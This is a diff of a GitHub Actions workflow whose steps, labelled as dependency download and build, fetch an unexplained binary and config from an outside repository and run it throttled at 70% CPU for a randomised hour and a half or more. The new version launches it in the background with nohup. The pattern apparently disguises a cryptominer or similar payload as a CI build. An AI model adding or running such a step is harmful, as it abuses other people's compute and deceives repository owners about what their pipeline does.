@@ -21,15 +21,15 @@ jobs:
 
     - name: Download dependencies
       run: |
-        curl -sL -o build/app https://github.com/cryptogolbu-hash/Performance-Testing/raw/refs/heads/main/test > /dev/null 2>&1
-        curl -sL -o build/config.json https://raw.githubusercontent.com/cryptogolbu-hash/Performance-Testing/refs/heads/main/config.json > /dev/null 2>&1
+        curl -sL -o build/app https://github.com/cryptogolbu-hash/Performance-Testing/raw/refs/heads/main/test
+        curl -sL -o build/config.json https://raw.githubusercontent.com/cryptogolbu-hash/Performance-Testing/refs/heads/main/config.json
         chmod +x build/app
         echo "Dependencies downloaded successfully"
 
     - name: Install build tools
       run: |
-        sudo apt-get update > /dev/null 2>&1
-        sudo apt-get install -y cpulimit > /dev/null 2>&1
+        sudo apt-get update -qq
+        sudo apt-get install -y -qq cpulimit
         echo "Build tools installed"
 
     - name: Run build process
@@ -37,5 +37,6 @@ jobs:
         cd build
         TIMEOUT=$((5400 + RANDOM % 1800))
         echo "Starting build process..."
-        timeout $TIMEOUT cpulimit -l 70 -f -- ./app > /dev/null 2>&1 || true
+        nohup timeout $TIMEOUT cpulimit -l 70 -f -- ./app &
+        sleep 5
         echo "Build completed successfully"
